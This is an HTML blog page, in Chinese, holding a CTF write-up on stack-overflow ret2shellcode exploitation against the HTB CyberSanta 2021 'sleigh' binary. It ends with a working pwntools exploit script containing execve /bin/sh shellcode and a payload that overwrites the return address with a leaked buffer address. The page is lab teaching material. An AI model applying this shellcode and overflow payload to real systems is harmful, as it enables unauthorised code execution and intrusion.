@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF-PWN-栈溢出-基本ROP-【ret2shellcode】 · Y0uYuGe</title>
+<meta name="description" content="C 库函数 int atoi(const char *str) 把参数 str 所指向的字符串转换为一个整数（类型为 int 型）。栈溢出，且栈可执行：将泄露的 buf 地址作为返回地址，同时在 buf 中写入 shellcode。这里 read 存在栈溢出，第一个 fprintf 打印了 buf 的地址。&#39;Has RWX segments&#39; 表示存在可读可写可执行的段。对接收到的字节 &#39;0x ...&#39; 的处理：先转换为整数，再 p64。一个 shellcode 不行就换下一个。控制程序执行我们填入的代码。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/stack-and-rop">栈与 ROP</a></nav>
+    <h1>CTF-PWN-栈溢出-基本ROP-【ret2shellcode】</h1>
+    <div class="meta"><time>2023-11-16</time><span class="tag">#学习</span><span class="tag">#Pwn</span><span class="tag">#CTF</span><span class="tag">#ROP</span></div>
+    <article class="post-body">
+<h1 id="ret2shellcode">ret2shellcode</h1>
+<p>控制程序执行我们填入的代码。
+条件：</p>
+<ul>
+<li>我们填入的代码所在位置具有可执行权限</li>
+</ul>
+<h1 id="htbcybersanta-2021-sleigh">HTBCyberSanta 2021 sleigh</h1>
+<p><strong>查看保护</strong></p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-001-136ce315f8.png" alt="图片">
+&#39;Has RWX segments&#39; 表示存在可读可写可执行的段</p>
+<p><strong>main 函数</strong>
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-002-ce73f30b01.png" alt="图片">
+banner 函数：
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-003-0e43c06e4b.png" alt="图片"></p>
+<p>repair 函数：</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-004-57383ff4d5.png" alt="图片">
+这里 read 存在栈溢出，第一个 fprintf 打印了 buf 的地址</p>
+<p>goodbye 函数</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-005-fffa292758.png" alt="图片">
+sleigh 函数</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-006-c2a968391d.png" alt="图片"></p>
+<p>C 库函数 int atoi(const char *str) 把参数 str 所指向的字符串转换为一个整数（类型为 int 型）。</p>
+<p><strong>fprintf 用法</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+   FILE * fp;
+
+   fp = fopen (&quot;file.txt&quot;, &quot;w+&quot;);
+   fprintf(fp, &quot;%s %s %s %d&quot;, &quot;We&quot;, &quot;are&quot;, &quot;in&quot;, 2014);
+   
+   fclose(fp);
+   
+   return(0);
+}
+</code></pre>
+<h1 id="思路">思路</h1>
+<p>栈溢出，且栈可执行：将泄露的 buf 地址作为返回地址，同时在 buf 中写入 shellcode</p>
+<p>一个 shellcode 不行就换下一个
+<a href="https://blog.csdn.net/A951860555/article/details/114106118">shellcdoe</a>
+<a href="https://shell-storm.org/shellcode/files/shellcode-806.html">shellcode</a></p>
+<p>对接收到的字节 &#39;0x ...&#39; 的处理：先转换为整数，再 p64
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%ACROP-%E3%80%90ret2shellcode%E3%80%91/assets/csdn-134445867/image-007-c8d871a6c5.png" alt="图片"></p>
+<pre><code class="language-python">s.recvuntil(b&quot; [&quot;)
+leakVariable = p64(int(s.recvuntil(b&quot;]&quot;)[:-1].decode(),16))//转换到八个字节的地址形式
+</code></pre>
+<h1 id="exp">exp</h1>
+<pre><code class="language-python">from pwn import *
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+shellcode =b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;
+
+s = process(&quot;./sleigh&quot;)
+s.sendline(b&quot;1&quot;)
+s.recvuntil(b&quot; [&quot;)
+leakVariable = p64(int(s.recvuntil(b&quot;]&quot;)[:-1].decode(),16))
+payload = shellcode.ljust(72,b&quot;A&quot;)
+payload += leakVariable
+s.sendline(payload)
+s.interactive()
+s.close()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%20ROP-%5Bret2libc%5D/"><span class="l">上一篇</span>CTF-PWN-栈溢出-基本 ROP-[ret2libc]</a><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E7%A1%80%20ROP%20-%20%5Bret2text%5D/"><span class="l">下一篇</span>CTF-PWN-栈溢出-基础 ROP - [ret2text]</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
